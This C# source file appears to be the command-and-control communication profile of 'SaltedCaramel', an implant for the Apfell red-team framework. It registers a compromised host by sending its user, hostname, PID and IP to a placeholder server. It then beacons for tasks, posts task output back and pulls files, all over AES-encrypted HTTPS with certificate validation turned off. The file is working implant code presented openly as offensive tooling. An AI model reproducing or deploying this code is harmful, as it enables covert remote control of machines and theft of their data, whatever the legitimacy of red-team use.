using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Apfell.C2Profiles;
using Apfell.Crypto;
using SaltedCaramel.Tasks;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Diagnostics;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using System.Threading;

namespace Profiles
{
    class DefaultEncryption : Crypto
    {
        private byte[] PSK = { 0x00 };

        public DefaultEncryption(string pskString)
        {
            PSK = Convert.FromBase64String(pskString);
        }
        override internal string Encrypt(string plaintext)
        {
            using (Aes scAes = Aes.Create())
            {
                // Use our PSK (generated in Apfell payload config) as the AES key
                scAes.Key = PSK;

                ICryptoTransform encryptor = scAes.CreateEncryptor(scAes.Key, scAes.IV);

                using (MemoryStream encryptMemStream = new MemoryStream())
                using (CryptoStream encryptCryptoStream = new CryptoStream(encryptMemStream, encryptor, CryptoStreamMode.Write))
                {
                    using (StreamWriter encryptStreamWriter = new StreamWriter(encryptCryptoStream))
                        encryptStreamWriter.Write(plaintext);
                    // We need to send iv:ciphertext
                    byte[] encrypted = scAes.IV.Concat(encryptMemStream.ToArray()).ToArray();
                    // Return base64 encoded ciphertext
                    return Convert.ToBase64String(encrypted);
                }
            }
        }

        override internal string Decrypt(string encrypted)
        {
            byte[] input = Convert.FromBase64String(encrypted);

            // Input is IV:ciphertext, IV is 16 bytes
            byte[] IV = new byte[16];
            byte[] ciphertext = new byte[input.Length - 16];
            Array.Copy(input, IV, 16);
            Array.Copy(input, 16, ciphertext, 0, ciphertext.Length);

            using (Aes scAes = Aes.Create())
            {
                // Use our PSK (generated in Apfell payload config) as the AES key
                scAes.Key = PSK;

                ICryptoTransform decryptor = scAes.CreateDecryptor(scAes.Key, IV);

                using (MemoryStream decryptMemStream = new MemoryStream(ciphertext))
                using (CryptoStream decryptCryptoStream = new CryptoStream(decryptMemStream, decryptor, CryptoStreamMode.Read))
                using (StreamReader decryptStreamReader = new StreamReader(decryptCryptoStream))
                {
                    string decrypted = decryptStreamReader.ReadToEnd();
                    // Return decrypted message from Apfell server
                    return decrypted;
                }
            }
        }
    }
    class DefaultProfile : C2Profile
    {
        private static Crypto cryptor = new DefaultEncryption("B64_PSK_HERE");
        private static WebClient client;
        private const string RootURL = "https://apfell_server/api/v1.3/";
        private static string InitializationEndpoint = RootURL + "crypto/aes_psk/{}";
        private static string TaskEndpoint = RootURL + "tasks/callback/{}/nextTask";
        private static string FileEndpoint = RootURL + "files/callback/{}";


        // Almost certainly need to pass arguments here to deal with proxy nonsense.
        public DefaultProfile()
        {
            // Necessary to disable certificate validation
            ServicePointManager.ServerCertificateValidationCallback =
                delegate { return true; };
            client = new WebClient();
        }

        private static string Get(string endpoint)
        {
            return cryptor.Decrypt(client.DownloadString(endpoint));
        }



        private static string Post(string endpoint, string message)
        {
            byte[] reqPayload = Encoding.UTF8.GetBytes(cryptor.Encrypt(message));

            return cryptor.Decrypt(Encoding.UTF8.GetString(client.UploadData(endpoint, reqPayload)));
        }
        override public string PostResponse(SCTaskResp taskresp)
        {
            string endpoint = RootURL + "responses/" + taskresp.id;
            try // Try block for HTTP requests
            {
                // Encrypt json to send to server
                string json = JsonConvert.SerializeObject(taskresp);
                string result = Post(endpoint, json);
                Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.id}: {result}");
                if (result.Contains("success"))
                    // If it was successful, return the result
                    return result;
                throw (new Exception($"POST Task Response {taskresp.id} Failed"));
            }
            catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
            {
                return e.Message;
            }

        }

        override public string RegisterAgent(SaltedCaramel.SCImplant agent)
        {
            string initEndpoint = String.Format(InitializationEndpoint, agent.UUID);
            // Get JSON string for implant
            // Format: {"user":"username", "host":"hostname", "pid":<pid>, "ip":<ip>, "uuid":<uuid>}
            string json = JsonConvert.SerializeObject(agent);
            Debug.WriteLine($"[+] InitializeImplant - Sending {json} to {initEndpoint}");

            string result = Post(initEndpoint, json);

            if (result.Contains("success"))
            {
                // If it was successful, initialize implant
                // Response is { "status": "success", "id": <id> }
                JObject resultJSON = (JObject)JsonConvert.DeserializeObject(result);
                return resultJSON.Value<string>("id");
            }
            else
            {
                throw (new Exception("Failed to retrieve an ID for new callback."));
            }
        }

        /// <summary>
        /// Check Apfell endpoint for new task
        /// </summary>
        /// <returns>CaramelTask with the next task to execute</returns>
        override public SCTask CheckTasking(SaltedCaramel.SCImplant agent)
        {
            string taskEndpoint = String.Format(TaskEndpoint, agent.CallbackID);
            SCTask task = JsonConvert.DeserializeObject<SCTask>(Get(taskEndpoint));
            if (task.command != "none")
                Debug.WriteLine("[-] CheckTasking - NEW TASK with ID: " + task.id);
            return task;
        }

        override public byte[] GetFile(string file_id, SaltedCaramel.SCImplant implant)
        {
            byte[] bytes;
            string fileEndpoint = String.Format(FileEndpoint, implant.CallbackID);
            try
            {
                string payload = "{\"file_id\": \"" + file_id + "\"}";
                // Get response from server and decrypt
                string result = Post(fileEndpoint, payload);
                bytes = Convert.FromBase64String(result);
                return bytes;
            }
            catch
            {
                return null;
            }
        }
    }
}
